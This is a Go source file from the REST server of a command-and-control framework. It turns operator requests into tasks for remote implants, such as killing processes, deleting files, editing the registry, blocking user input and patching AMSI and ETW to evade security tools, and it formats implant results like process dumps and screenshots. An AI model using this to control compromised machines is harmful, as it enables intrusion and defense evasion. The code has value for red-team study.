// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cirrus

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"hash"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/PurpleSec/escape"
	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/c2/task/result"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/winapi"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	table  = "0123456789abcdef"
	negOne = ^uint64(0)
)

var timeFormats = [...]string{
	time.RFC3339,
	"2006-01-02 15:04 MST",
	"2006-01-02 15:04Z07",
	"2006-01-02 15:04",
	"06-01-02 15:04 MST",
	"06-01-02 15:04Z07",
	"06-01-02 15:04",
	"01-02 15:04 MST",
	"01-02 15:04Z07",
	"01-02 15:04",
	"2006-01-02",
	"06-01-02",
	"01-02",
	"15:04 MST",
	"15:04Z07",
	"15:04",
}

var hashers = sync.Pool{
	New: func() any {
		return sha256.New()
	},
}

var (
	errInvalidB64      = xerr.New("invalid base64 value")
	errInvalidPID      = xerr.New(`specify a valid "pid" value`)
	errInvalidRaw      = xerr.New(`cannot use "raw" without any data`)
	errInvalidTime     = xerr.New(`invalid time value`)
	errInvalidHost     = xerr.New(`specify a non-empty "host" value`)
	errInvalidData     = xerr.New(`invalid or empty "data" value`)
	errInvalidFake     = xerr.New(`invalid or empty "fake" value`)
	errInvalidType     = xerr.New("invalid type")
	errInvalidPath     = xerr.New(`specify a non-empty "path" value`)
	errInvalidName     = xerr.New(`specify a non-empty "name" value`)
	errInvalidDest     = xerr.New(`specify a non-empty "dest" value`)
	errInvalidTitle    = xerr.New(`specify a non-empty "title" value`)
	errInvalidEvade    = xerr.New(`invalid "evade" value`)
	errInvalidAction   = xerr.New("invalid action")
	errInvalidScript   = xerr.New("script data inside script")
	errInvalidHandle   = xerr.New(`specify a valid "handle" value`)
	errInvalidSource   = xerr.New(`specify a non-empty "source" value`)
	errInvalidMethod   = xerr.New(`invalid "method" value`)
	errInvalidCommand  = xerr.New(`invalid or empty "command" value`)
	errInvalidPayload  = xerr.New(`invalid "payload" value`)
	errInvalidFunction = xerr.New(`specify a non-empty "function" value`)
	errInvalidDataPath = xerr.New(`specify a non-empty "data" or "path" value`)
	errInvalidDuration = xerr.New(`specify a greater than zero "seconds" value`)
	errInvalidProtocol = xerr.New(`invalid "protocol" value`)
)

func isTrue(s string) bool {
	if len(s) == 0 {
		return true
	}
	switch s[0] {
	case 't', 'T', 'e', 'E', 'y', 'Y', '1':
		return true
	}
	return false
}
func hashSum(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	var (
		h = hashers.Get().(hash.Hash)
		v = make([]byte, 0, 32)
		o [64]byte
	)
	h.Write(b)
	v = h.Sum(v)
	for i, n := 0, 0; i < 32; i++ {
		o[n] = table[v[i]>>4]
		o[n+1] = table[v[i]&0x0F]
		n += 2
	}
	v = nil
	h.Reset()
	hashers.Put(h)
	return " sha256:" + string(o[:])
}
func isValidName(s string) bool {
	if len(s) == 0 {
		return true
	}
	for i := range s {
		switch {
		case s[i] <= 57 && s[i] >= 48: // 0 - 9
		case s[i] <= 90 && s[i] >= 65: // A - Z
		case s[i] <= 122 && s[i] >= 97: // a - z
		case s[i] == 45 || s[i] == 46 || s[i] == 95: // - . _
		default:
			return false
		}
	}
	return true
}
func writeBase64(w io.Writer, b []byte) {
	d := base64.NewEncoder(base64.StdEncoding, w)
	d.Write(b)
	d.Close()
}
func parseJitter(s string) (int, error) {
	if i := len(s) - 1; s[i] == '%' {
		s = s[:i]
	}
	if len(s) == 0 {
		return 0, errInvalidJitter
	}
	j, err := strconv.ParseUint(s, 10, 8)
	if err != nil {
		return 0, errInvalidJitter
	}
	if j > 100 {
		return 0, errInvalidJitter
	}
	return int(j), nil
}
func readEmptyB64(s string) ([]byte, error) {
	if len(s) == 0 {
		return nil, nil
	}
	b, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return nil, errInvalidB64
	}
	return b, nil
}
func parseTime(s string) (time.Time, error) {
	var (
		t   time.Time
		err error
	)
	for i := range timeFormats {
		if t, err = time.Parse(timeFormats[i], s); err == nil {
			break
		}
	}
	if err == nil {
		var (
			y, m, d = t.Date()
			x       = time.Now()
			j, k, l = x.Date()
		)
		if y > 0 && m > 0 && d > 0 {
			return t, nil
		}
		if y == 0 {
			y = j
		}
		if m == 0 {
			m = k
		}
		if d == 0 {
			d = l
		}
		var (
			h, n, c = t.Clock()
			v       = time.Date(y, m, d, h, n, c, 0, t.Location())
		)
		if x.After(v) {
			return v.AddDate(1, 0, 0), nil
		}
		return v, nil
	}
	return t, err
}
func parseDayString(s string) (uint8, error) {
	if len(s) == 0 {
		return 0, nil
	}
	if s == "SMTWRFS" {
		return 0, nil
	}
	var d uint8
	for i := range s {
		switch s[i] {
		case 's', 'S':
			if i == 0 {
				d |= cfg.DaySunday
				break
			}
			d |= cfg.DaySaturday
		case 'm', 'M':
			d |= cfg.DayMonday
		case 't', 'T':
			d |= cfg.DayTuesday
		case 'w', 'W':
			d |= cfg.DayWednesday
		case 'r', 'R':
			d |= cfg.DayThursday
		case 'f', 'F':
			d |= cfg.DayFriday
		default:
			return 0, xerr.New("invalid day char")
		}
	}
	return d, nil
}
func parseSleep(s string) (time.Duration, int, error) {
	if i := strings.IndexByte(s, '/'); i > 0 {
		var (
			b, a   = strings.TrimSpace(s[:i]), strings.TrimSpace(s[i+1:])
			d, err = parseDuration(b, true)
		)
		if err != nil {
			return 0, 0, errInvalidSleep
		}
		j, err := parseJitter(a)
		if err != nil {
			return 0, 0, errInvalidJitter
		}
		return d, j, nil
	}
	d, err := parseDuration(strings.TrimSpace(s), true)
	return d, -1, err
}
func evadePacket(a string) (*com.Packet, string, error) {
	var f uint8
	if a == "all" {
		f = device.EvadeAll
	} else {
		var v []string
		if strings.IndexByte(a, ',') > 0 {
			v = strings.Split(strings.ToLower(a), ",")
		} else {
			v = strings.Split(strings.ToLower(a), " ")
		}
		for i := range v {
			switch strings.TrimSpace(v[i]) {
			case "all":
				f |= device.EvadeAll
			case "erase_header", "eh":
				f |= device.EvadeEraseHeader
			case "patch_etw", "pe", "zerotrace":
				f |= device.EvadeWinHideThreads
			case "patch_amsi", "pa", "zeroamsi":
				f |= device.EvadeWinPatchAmsi
			case "hide_threads", "ht", "zerothreads":
				f |= device.EvadeWinPatchTrace
			default:
				return nil, "", errInvalidEvade
			}
		}
	}
	return task.Evade(f), "evade " + a + "/" + util.Uitoa16(uint64(f)), nil
}
func (c *Cirrus) context(_ net.Listener) context.Context {
	return c.ctx
}
func parseDuration(s string, b bool) (time.Duration, error) {
	if len(s) == 0 {
		if !b {
			return 0, nil
		}
		return 0, errInvalidSleep
	}
	v := strings.ToLower(s)
	switch v[len(v)-1] {
	case 's', 'h', 'm':
	default:
		v += "s"
	}
	d, err := time.ParseDuration(v)
	if err != nil {
		return 0, errInvalidSleep
	}
	if (!b && d < 0) || (b && d <= 0) {
		return 0, errInvalidSleep
	}
	if !b {
		return d, nil
	}
	if d < time.Second || d > time.Hour*24 {
		return 0, errInvalidSleep
	}
	return d, nil
}
func writeJobJSON(z bool, t uint8, j *com.Packet, w io.Writer) error {
	if err := writeJobJSONSimple(z, t, j, w); err != io.ErrClosedPipe {
		return err
	}
	o := base64.NewEncoder(base64.StdEncoding, w)
	switch w.Write([]byte(`{"type":"`)); t {
	case task.TvPull:
		w.Write([]byte(`pull","data":"`))
		io.Copy(o, j)
	case task.TvNetcat:
		r, err := result.Netcat(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`netcat","data":"`))
		io.Copy(o, r)
	case task.TvDownload:
		p, d, n, r, err := result.Download(j)
		if err != nil {
			return err
		}
		w.Write([]byte(
			`download","path":` + escape.JSON(p) +
				`,"size":` + util.Uitoa(n) +
				`,"dir":` + strconv.FormatBool(d) + `,"data":"`,
		))
		io.Copy(o, r)
	case task.TvScreenShot, task.TvProcDump:
		r, err := result.ProcessDump(j)
		if err != nil {
			return err
		}
		if t == task.TvProcDump {
			w.Write([]byte(`dump",`))
		} else {
			w.Write([]byte(`shot",`))
		}
		w.Write([]byte(`"data":"`))
		io.Copy(o, r)
	case task.TvExecute, task.TvZombie, task.TvPullExecute:
		p, c, r, err := result.Process(j)
		if err != nil {
			return err
		}
		w.Write([]byte(
			`execute", "pid":` + util.Uitoa(uint64(p)) +
				`,"exit":` + util.Itoa(int64(c)) + `,"data":"`),
		)
		io.Copy(o, r)
	default:
		w.Write([]byte(`unknown","data":"`))
		io.Copy(o, j)
	}
	o.Close()
	w.Write([]byte{'"', '}'})
	o = nil
	return nil
}
func ioPacket(c routex.Content, a string) (*com.Packet, string, error) {
	switch strings.ToLower(a) {
	case "kill":
		if i := c.UintDefault("pid", 0); i > 0 {
			return task.Kill(uint32(i)), "kill " + util.Uitoa(i), nil
		}
		return nil, "", errInvalidPID
	case "touch":
		if s := c.StringDefault("path", ""); len(s) > 0 {
			return task.Touch(s), "touch " + s, nil
		}
		return nil, "", errInvalidPath
	case "delete":
		if s := c.StringDefault("path", ""); len(s) > 0 {
			return task.Delete(s, c.BoolDefault("force", false)), "delete " + s, nil
		}
		return nil, "", errInvalidPath
	case "kill_name":
		if s := c.StringDefault("name", ""); len(s) > 0 {
			return task.KillName(s), "kill_name " + s, nil
		}
		return nil, "", errInvalidName
	case "move", "copy":
		var (
			d = c.StringDefault("dest", "")
			s = c.StringDefault("source", "")
		)
		if len(s) == 0 {
			return nil, "", errInvalidSource
		}
		if len(d) == 0 {
			return nil, "", errInvalidDest
		}
		if a[0] == 'm' || a[0] == 'M' {
			return task.Move(s, d), "move " + s + " " + d, nil
		}
		return task.Copy(s, d), "copy " + s + " " + d, nil
	}
	return nil, "", errInvalidAction
}
func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
	switch h := c.UintDefault("handle", 0); strings.ToLower(a) {
	case "wtf":
		if d := c.UintDefault("seconds", 30); d > 0 {
			return task.WindowWTF(time.Duration(d) * time.Second), "window wtf_mode", nil
		}
		return nil, "", errInvalidDuration
	case "ls", "get":
		return task.WindowList(), "window list", nil
	case "wallpaper":
		if s := c.StringDefault("path", ""); len(s) > 0 {
			return task.Wallpaper(s), "wallpaper " + s, nil
		}
		b, err := c.Bytes("data")
		if err != nil {
			return nil, "", err
		}
		return task.WallpaperBytes(b), "wallpaper" + hashSum(b), nil
	case "cl", "close":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		return task.WindowClose(h), "window " + util.Uitoa16(h) + " close", nil
	case "fg", "focus":
		if h == 0 || h == negOne {
			return nil, "", errInvalidHandle
		}
		return task.WindowFocus(h), "window " + util.Uitoa16(h) + " focus", nil
	case "sw", "show", "desktop":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		var n uint8
		if a[0] == 'D' || a[0] == 'd' {
			n = winapi.SwMinimize
		} else {
			if v, err := c.String("state"); err == nil {
				if len(v) == 0 {
					n = winapi.SwShow
				} else {
					switch strings.ToLower(v) {
					case "hide":
						n = winapi.SwHide
					case "show":
						n = winapi.SwShow
					case "normal":
						n = winapi.SwNormal
					case "restore":
						n = winapi.SwRestore
					case "min", "minimize":
						n = winapi.SwMinimize
					case "max", "maximize":
						n = winapi.SwMaximize
					default:
						n = winapi.SwDefault
					}
				}
			} else {
				if i := uint8(c.UintDefault("state", 0)); i > winapi.SwMinimizeForce {
					n = winapi.SwMinimizeForce
				} else {
					n = i
				}
			}
		}
		return task.WindowShow(h, n), "window " + util.Uitoa16(h) + " show " + util.Uitoa(uint64(n)), nil
	case "tr", "trans", "transparent":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		n := c.UintDefault("level", 0)
		if n > 255 {
			n = 255
		}
		return task.WindowTransparency(h, uint8(n)), "window " + util.Uitoa16(h) + " transparency " + util.Uitoa(n), nil
	case "dis", "en", "disable", "enable":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		if a[0] == 'E' || a[0] == 'e' {
			return task.WindowEnable(h, true), "window " + util.Uitoa16(h) + " enable", nil
		}
		return task.WindowEnable(h, false), "window " + util.Uitoa16(h) + " disable", nil
	case "mv", "pos", "move", "size", "resize":
		if h == 0 || h == negOne {
			return nil, "", errInvalidHandle
		}
		x, y, w, v := int32(-1), int32(-1), int32(-1), int32(-1)
		if n, err := c.Int("x"); err == nil {
			x = int32(n)
		}
		if n, err := c.Int("y"); err == nil {
			y = int32(n)
		}
		if n, err := c.Int("width"); err == nil {
			w = int32(n)
		}
		if n, err := c.Int("height"); err == nil {
			v = int32(n)
		}
		return task.WindowMove(h, x, y, w, v), "window " + util.Uitoa16(h) + " move " +
			util.Itoa(int64(x)) + " " + util.Itoa(int64(y)) + " " + util.Itoa(int64(w)) + " " +
			util.Itoa(int64(v)), nil
	case "in", "send", "type", "text", "input":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		v := c.StringDefault("text", "")
		return task.WindowSendInput(h, v), "window " + util.Uitoa16(h) + " sendinput" + hashSum([]byte(v)), nil
	case "mb", "msg", "msgbox", "message", "messagebox":
		var (
			f = c.UintDefault("flags", 0)
			d = c.StringDefault("text", "")
			t = c.StringDefault("title", "")
		)
		if len(t) == 0 {
			return nil, "", errInvalidTitle
		}
		m := "window msgbox " + util.Uitoa16(h)
		if len(t) > 0 {
			m += " " + t
		}
		return task.WindowMessageBox(h, t, d, uint32(f)), m, nil
	case "bi", "sm", "hc", "block_input", "swap_mouse", "high_contrast":
		switch e := c.BoolDefault("enable", false); a[0] {
		case 'B', 'b':
			return task.BlockInput(e), "block input " + strconv.FormatBool(e), nil
		case 'H', 'h':
			return task.HighContrast(e), "high contrast " + strconv.FormatBool(e), nil
		case 'S', 's':
			return task.SwapMouse(e), "swap mouse" + strconv.FormatBool(e), nil
		}
	}
	return nil, "", errInvalidAction
}
func wtsPacket(c routex.Content, a string) (*com.Packet, string, error) {
	switch s := c.IntDefault("session", -1); strings.ToLower(a) {
	case "ls":
		return task.UserLogins(), "wts list", nil
	case "ps":
		return task.UserProcesses(int32(s)), "wts ps " + util.Itoa(s), nil
	case "logoff":
		return task.UserLogoff(int32(s)), "wts logoff " + util.Itoa(s), nil
	case "msg", "message":
		return task.UserMessageBox(
			int32(s), c.StringDefault("title", ""), c.StringDefault("text", ""), uint32(c.IntDefault("flags", 0)),
			uint32(c.IntDefault("seconds", 0)), c.BoolDefault("wait", false),
		), "wts message " + util.Itoa(s), nil
	case "dis", "disconnect":
		return task.UserDisconnect(int32(s)), "wts disconnect " + util.Itoa(s), nil
	}
	return nil, "", errInvalidAction
}
func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
	switch t {
	case task.MvCwd:
		w.Write([]byte(`{"type":"cd"}`))
	case task.MvPwd:
		d, err := result.Pwd(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"pwd","path":` + escape.JSON(d) + `}`))
	case task.MvList:
		f, err := result.Ls(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"list","entries":[`)); len(f) > 0 {
			for i := range f {
				if i > 0 {
					w.Write([]byte(","))
				}
				w.Write([]byte(
					`{"name":` + escape.JSON(f[i].Name()) +
						`,"mode":` + util.Uitoa(uint64(f[i].Mode())) +
						`,"mode_str":"` + f[i].Mode().String() +
						`","size":` + util.Uitoa(uint64(f[i].Size())) +
						`,"modtime":"` + f[i].ModTime().Format(time.RFC3339) + `"}`,
				))
			}
		}
		w.Write([]byte("]}"))
	case task.MvTime:
		w.Write([]byte(`{"type":"time"}`))
	case task.MvProxy:
		w.Write([]byte(`{"type":"proxy"}`))
	case task.MvSpawn:
		p, err := result.Spawn(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"spawn","pid":` + util.Uitoa(uint64(p)) + `}`))
	case task.MvScript:
		if z {
			return errInvalidScript
		}
		v, err := result.Script(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"script", "count":` + util.Uitoa(uint64(len(v))) + `, "entries": [`))
		for i := range v {
			if i > 0 {
				w.Write([]byte{','})
			}
			if v[i].Flags&com.FlagError != 0 {
				m, err := v[i].StringVal()
				if err != nil {
					return err
				}
				w.Write([]byte(`{"type":"error","error":` + escape.JSON(m) + `}`))
				continue
			}
			if v[i].Empty() {
				w.Write([]byte(`{"type":"empty"}`))
				continue
			}
			if err := writeJobJSON(true, v[i].ID, v[i], w); err != nil && err != io.ErrClosedPipe {
				return err
			}
		}
		w.Write([]byte{']', '}'})
	case task.MvMounts:
		m, err := result.Mounts(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"mounts","entries":[`)); len(m) > 0 {
			for i := range m {
				if i > 0 {
					w.Write([]byte{','})
				}
				w.Write([]byte(escape.JSON(m[i])))
			}
		}
		w.Write([]byte{']', '}'})
	case task.MvWhoami:
		u, p, err := result.Whoami(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"whoami","user":` + escape.JSON(u) + `, "path":` + escape.JSON(p) + `}`))
	case task.MvRefresh:
		w.Write([]byte(`{"type":"refresh"}`))
	case task.MvMigrate:
		w.Write([]byte(`{"type":"migrate"}`))
	case task.MvProfile:
		w.Write([]byte(`{"type":"profile"}`))
	case task.MvProcList:
		p, err := result.ProcessList(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"processes","entries":[`)); len(p) > 0 {
			for i := range p {
				if i > 0 {
					w.Write([]byte{','})
				}
				w.Write([]byte(
					`{"name":` + escape.JSON(p[i].Name) +
						`,"user":` + escape.JSON(p[i].User) +
						`,"pid":` + util.Uitoa(uint64(p[i].PID)) +
						`,"ppid":` + util.Uitoa(uint64(p[i].PPID)) + `}`,
				))
			}
		}
		w.Write([]byte{']', '}'})
	case task.MvCheckDebug:
		if r, _ := result.IsDebugged(j); r {
			w.Write([]byte(`{"type":"check_debug","debug":true}`))
		} else {
			w.Write([]byte(`{"type":"check_debug","debug":false}`))
		}
	case task.TvUI:
		w.Write([]byte(`{"type":"ui"}`))
	case task.TvPull:
		p, n, _, err := result.Pull(j) // Ignore the reader, as if true, we're already Seeked.
		if err != nil {
			return err
		}
		if len(p) == 0 && n == 0 {
			// Pass back to writeJobJSON
			return io.ErrClosedPipe
		}
		w.Write([]byte(`{"type":"upload","size":` + util.Uitoa(n) + `,"path":` + escape.JSON(p) + `}`))
	case task.TvWait:
		w.Write([]byte(`{"type":"wait"}`))
	case task.TvTroll:
		w.Write([]byte(`{"type":"troll"}`))
	case task.TvPatch:
		w.Write([]byte(`{"type":"reload_dll"}`))
	case task.TvCheck:
		if r, _ := result.CheckDLL(j); r {
			w.Write([]byte(`{"type":"check_dll","tainted":false}`))
		} else {
			w.Write([]byte(`{"type":"check_dll","tainted":true}`))
		}
	case task.TvEvade:
		w.Write([]byte(`{"type":"evade"}`))
	case task.TvPower:
		w.Write([]byte(`{"type":"power"}`))
	case task.TvRename:
		w.Write([]byte(`{"type":"rename"}`))
	case task.TvLogins:
		e, err := result.UserLogins(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"logins","entries":[`)); len(e) > 0 {
			for i := range e {
				if i > 0 {
					w.Write([]byte{','})
				}
				w.Write([]byte(
					`{"user":` + escape.JSON(e[i].User) +
						`,"host":` + escape.JSON(e[i].Host) +
						`,"id":` + util.Uitoa(uint64(e[i].ID)) +
						`,"from":"` + e[i].From.String() +
						`","login_time":"` + e[i].Login.Format(time.RFC3339) +
						`","last_input_time":"` + e[i].LastInput.Format(time.RFC3339) +
						`","status":"` + e[i].State() + `"}`,
				))
			}
		}
		w.Write([]byte{']', '}'})
	case task.TvUpload:
		p, n, err := result.Upload(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"upload","size":` + util.Uitoa(n) + `,"path":` + escape.JSON(p) + `}`))
	case task.TvElevate:
		w.Write([]byte(`{"type":"elevate"}`))
	case task.TvRevSelf:
		w.Write([]byte(`{"type":"rev2self"}`))
	case task.TvUnTrust:
		w.Write([]byte(`{"type":"untrust"}`))
	case task.TvFuncMap:
		w.Write([]byte(`{"type":"funcmap"}`))
	case task.TvRegistry:
		e, v, err := result.Registry(j)
		if err != nil {
			return err
		}
		if !v {
			w.Write([]byte(`{"type":"registry", "status":false}`))
			return nil
		}
		if len(e) == 0 {
			w.Write([]byte(`{"type":"registry", "status":true}`))
			return nil
		}
		w.Write([]byte(`{"type":"registry","entries":[`))
		for i := range e {
			if i > 0 {
				w.Write([]byte{','})
			}
			w.Write([]byte(
				`{"name":` + escape.JSON(e[i].Name) +
					`,"type":` + escape.JSON(e[i].TypeName()) +
					`,"value":` + escape.JSON(e[i].String()) +
					`,"data":"` + base64.StdEncoding.EncodeToString(e[i].Data) + `"}`,
			))
		}
		w.Write([]byte{']', '}'})
	case task.TvSystemIO:
		p, s, r, err := result.SystemIO(j)
		if err != nil {
			return err
		}
		if !r {
			w.Write([]byte(`{"type":"system_io", "status":false}`))
			return nil
		}
		if len(p) == 0 && s == 0 {
			w.Write([]byte(`{"type":"system_io", "status":true}`))
			return nil
		}
		w.Write([]byte(`{"type":"system_io","path":` + escape.JSON(p) + `,"size":` + util.Uitoa(s) + `}`))
	case task.TvLoginsAct:
		w.Write([]byte(`{"type":"logins_action"}`))
	case task.TvLoginUser:
		w.Write([]byte(`{"type":"login_user"}`))
	case task.TvWindowList:
		e, err := result.WindowList(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"window_list","entries":[`)); len(e) > 0 {
			for i := range e {
				if i > 0 {
					w.Write([]byte{','})
				}
				w.Write([]byte(
					`{"name":` + escape.JSON(e[i].Name) +
						`,"handle":` + util.Uitoa(uint64(e[i].Handle)) +
						`,"minimized":` + strconv.FormatBool(e[i].IsMinimized()) +
						`,"maximized":` + strconv.FormatBool(e[i].IsMaximized()) +
						`,"x":` + util.Itoa(int64(e[i].X)) +
						`,"y":` + util.Itoa(int64(e[i].Y)) +
						`,"width":` + util.Itoa(int64(e[i].Width)) +
						`,"height":` + util.Itoa(int64(e[i].Height)) + `}`,
				))
			}
		}
		w.Write([]byte{']', '}'})
	case task.TvLoginsProc:
		p, err := result.UserProcessList(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"logins_processes","entries":[`)); len(p) > 0 {
			for i := range p {
				if i > 0 {
					w.Write([]byte{','})
				}
				w.Write([]byte(
					`{"name":` + escape.JSON(p[i].Name) +
						`,"user":` + escape.JSON(p[i].User) +
						`,"pid":` + util.Uitoa(uint64(p[i].PID)) +
						`,"ppid":` + util.Uitoa(uint64(p[i].PPID)) + `}`,
				))
			}
		}
		w.Write([]byte{']', '}'})
	case task.TvFuncMapList:
		e, err := result.FuncRemapList(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"funcmap_list","entries":[`)); len(e) > 0 {
			for i := range e {
				if i > 0 {
					w.Write([]byte{','})
				}
				w.Write([]byte(
					`{"hash":` + util.Uitoa(uint64(e[i].Hash)) +
						`,"original":` + util.Uitoa(uint64(e[i].Original)) +
						`,"swapped":` + util.Uitoa(uint64(e[i].Swapped)) + `}`,
				))
			}
		}
		w.Write([]byte{']', '}'})
	case task.TvAssembly, task.TvDLL:
		h, p, c, err := result.Assembly(j)
		if err != nil {
			return err
		}
		if t == task.TvDLL {
			w.Write([]byte(`{"type":"dll",`))
		} else {
			w.Write([]byte(`{"type":"assembly",`))
		}
		w.Write([]byte(
			`"handle":` + util.Uitoa(uint64(h)) +
				`,"exit":` + util.Uitoa(uint64(c)) +
				`,"pid":` + util.Uitoa(uint64(p)) + `}`,
		))
	default:
		return io.ErrClosedPipe
	}
	return nil
}
func writeError(c int, e string, w http.ResponseWriter, _ *routex.Request) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(c)
	w.Write([]byte(`{"source": "xmt_rest", "code": ` + util.Uitoa(uint64(c)) + `, "error": `))
	if len(e) > 0 {
		w.Write([]byte(escape.JSON(e)))
	} else {
		w.Write([]byte(http.StatusText(c)))
	}
	w.Write([]byte{'}'})
}
func encoding(_ context.Context, w http.ResponseWriter, _ *routex.Request) bool {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	return true
}
func registryPacket(c routex.Content, a, k, v string) (*com.Packet, string, error) {
	switch strings.ToLower(a) {
	case "get":
		return task.RegGet(k, v), "regedit get " + k + ":" + v, nil
	case "ls", "dir":
		return task.RegLs(k), "regedit ls " + k + ":" + v, nil
	case "del", "delete", "rm", "rem", "remove":
		if len(v) == 0 {
			return task.RegDeleteKey(k, c.BoolDefault("force", false)), "regedit deltree " + k, nil
		}
		return task.RegDelete(k, v, c.BoolDefault("force", false)), "regedit delete " + k + ":" + v, nil
	case "set", "edit", "update":
		switch strings.ToLower(c.StringDefault("type", "")) {
		case "sz", "string":
			d := c.StringDefault("data", "")
			return task.RegSetString(k, v, d), "regedit edit " + k + ":" + v + hashSum([]byte(d)), nil
		case "bin", "binary":
			b, err := c.BytesEmpty("data")
			if err != nil {
				return nil, "", err
			}
			return task.RegSetBytes(k, v, b), "regedit edit " + k + ":" + v + hashSum(b), nil
		case "uint32", "dword":
			if i, ok := c.Uint("data"); ok == nil {
				return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + util.Uitoa(i), nil
			}
			var (
				d      = c.StringDefault("data", "")
				i, err = strconv.ParseInt(d, 0, 32)
			)
			if err != nil {
				return nil, "", err
			}
			return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + d, nil
		case "uint64", "qword":
			if i, ok := c.Uint("data"); ok == nil {
				return task.RegSetQword(k, v, i), "regedit edit " + k + ":" + v + " " + util.Uitoa(i), nil
			}
			var (
				d      = c.StringDefault("data", "")
				i, err = strconv.ParseInt(d, 0, 64)
			)
			if err != nil {
				return nil, "", err
			}
			return task.RegSetQword(k, v, uint64(i)), "regedit edit " + k + ":" + v + " " + d, nil
		case "multi", "multi_sz":
			d := c.StringDefault("data", "")
			return task.RegSetStringList(k, v, strings.Split(d, "\n")), "regedit edit " + k + ":" + v + " " + strings.ReplaceAll(d, "\n", "|"), nil
		case "exp_sz", "expand_string":
			d := c.StringDefault("data", "")
			return task.RegSetExpandString(k, v, d), "regedit edit " + k + ":" + v + " " + d, nil
		default:
			return nil, "", errInvalidType
		}
	}
	return nil, "", errInvalidAction
}
func (c *Cirrus) auth(_ context.Context, w http.ResponseWriter, r *routex.Request) bool {
	if len(c.Auth) == 0 {
		return true
	}
	if !strings.EqualFold(r.Header.Get("X-CirrusAuth"), c.Auth) {
		w.WriteHeader(http.StatusUnauthorized)
		c.log.Info(`[cirrus/http] Received invalid auth token from: %s!`, r.RemoteAddr)
		return false
	}
	return true
}
func (c *Cirrus) websocket(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	s, err := c.ws.Upgrade(w, r.Request, nil)
	if err != nil {
		writeError(http.StatusInternalServerError, err.Error(), w, r)
		return
	}
	c.log.Trace(`[cirrus/http] Received websocket request from: %s!`, r.RemoteAddr)
	c.events.subscribe(s)
}
